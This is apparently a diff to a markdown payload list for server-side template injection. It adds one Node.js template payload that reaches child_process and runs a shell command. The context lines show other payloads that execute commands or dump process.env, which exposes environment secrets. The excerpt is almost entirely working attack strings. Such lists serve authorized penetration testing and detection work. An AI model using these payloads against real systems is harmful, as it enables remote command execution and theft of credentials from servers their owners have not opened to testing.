@@ -16,6 +16,7 @@
 {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
 #{7*7}
 #{JSON.stringify(this.constructor.constructor('return process.env')())}
+#{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id", { encoding: "utf8" })')()}
 ```
 
 ## Java
